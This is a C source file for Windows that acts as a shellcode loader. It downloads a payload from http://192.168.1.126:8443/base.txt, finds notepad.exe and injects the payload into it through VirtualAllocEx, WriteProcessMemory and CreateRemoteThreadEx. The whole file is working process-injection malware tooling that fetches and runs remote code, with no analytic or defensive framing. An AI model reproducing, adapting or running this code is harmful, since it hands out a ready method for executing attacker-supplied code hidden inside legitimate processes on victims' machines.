#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>  // For EnumProcesses and GetModuleFileNameEx

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";
LPVOID rBuffer = NULL;
HANDLE hProcess = NULL, hThread = NULL;
DWORD TID = 0;
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

// Function to get PID by process name
DWORD GetPIDByName(const char* processName) {
    DWORD pids[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(pids, sizeof(pids), &cbNeeded)) {
        printf("Failed to enumerate processes.\n");
        return 0;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    // Iterate through all processes
    for (i = 0; i < cProcesses; i++) {
        if (pids[i] == 0) continue;

        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (hProcess != NULL) {
            char processNameBuffer[MAX_PATH];
            if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, sizeof(processNameBuffer) / sizeof(char))) {
                // Check if process name matches
                if (strstr(processNameBuffer, processName) != NULL) {
                    CloseHandle(hProcess);
                    return pids[i]; // Return the PID
                }
            }
            CloseHandle(hProcess);
        }
    }

    printf("Process %s not found.\n", processName);
    return 0;
}

int main() {
    const char* url = "http://192.168.1.126:8443/base.txt";
    const char* targetProcess = "notepad.exe";  // The process name to inject into

    // Open a connection to download the shellcode
    HINTERNET hInternet = InternetOpen("FileDownloader/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("Failed to open internet connection. Error code: %ld\n", GetLastError());
        return EXIT_FAILURE;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        printf("Failed to open URL. Error code: %ld\n", GetLastError());
        InternetCloseHandle(hInternet);
        return EXIT_FAILURE;
    }

    char* shellcode = NULL;
    DWORD bytesRead, totalSize = 0;
    char buffer[4096];

    // Read the content of the file into the char array
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        shellcode = (char*)realloc(shellcode, totalSize + bytesRead + 1);
        if (!shellcode) {
            printf("Memory allocation failed.\n");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }
        memcpy(shellcode + totalSize, buffer, bytesRead);
        totalSize += bytesRead;
    }

    // Null-terminate the string
    if (shellcode) {
        shellcode[totalSize] = '\0'; // Ensure it's a valid C string
        printf("Shellcode downloaded and ready for injection.\n");

        // Find the PID of notepad.exe
        DWORD PID = GetPIDByName(targetProcess);
        if (PID == 0) {
            printf("Process not found, cannot inject.\n");
            free(shellcode);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }

        // 1. Open a handle to the process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
        if (!hProcess) {
            printf("%s Couldn't get a handle to the process (%ld), error: %ld\n", e, PID, GetLastError());
            free(shellcode);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }

        printf("%s Got a handle to the process!\n\\---0x%p\n", k, hProcess);

        // 2. Allocate space in the target process for the shellcode
        rBuffer = VirtualAllocEx(hProcess, NULL, totalSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        if (!rBuffer) {
            printf("Failed to allocate memory in target process.\n");
            CloseHandle(hProcess);
            free(shellcode);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }

        printf("%s Allocated %zu bytes of memory in the target process\n", k, totalSize);

        // 3. Write the shellcode to the process memory
        if (!WriteProcessMemory(hProcess, rBuffer, shellcode, totalSize, NULL)) {
            printf("Failed to write memory to target process.\n");
            CloseHandle(hProcess);
            free(shellcode);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }

        printf("%s Wrote %zu bytes of shellcode to process (%ld) memory\n", k, totalSize, PID);

        // 4. Create a remote thread to execute the shellcode
        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
        if (!hThread) {
            printf("%s Couldn't create a remote thread, error: %ld\n", e, GetLastError());
            CloseHandle(hProcess);
            free(shellcode);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return EXIT_FAILURE;
        }

        printf("%s Got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

        // 5. Wait for the remote thread to finish executing
        printf("%s Waiting for thread to finish executing\n", k);
        WaitForSingleObject(hThread, INFINITE);
        printf("%s Thread finished executing\n", k);

        // Clean up
        printf("%s Cleaning up\n", i);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        free(shellcode);
    } else {
        printf("Failed to read shellcode from URL.\n");
    }

    // Close internet handles
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return EXIT_SUCCESS;
}
